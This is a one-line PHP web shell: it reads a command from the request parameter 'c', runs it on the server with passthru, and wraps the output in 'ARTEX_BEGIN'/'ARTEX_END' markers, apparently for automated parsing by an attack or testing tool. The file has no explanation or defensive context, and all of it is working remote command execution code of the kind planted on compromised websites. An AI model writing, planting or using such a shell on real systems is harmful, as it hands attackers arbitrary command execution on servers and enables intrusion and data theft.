<?php $c=isset($_REQUEST['c'])?$_REQUEST['c']:'id'; echo "ARTEX_BEGIN\n"; passthru($c." 2>&1"); echo "\nARTEX_END"; ?>
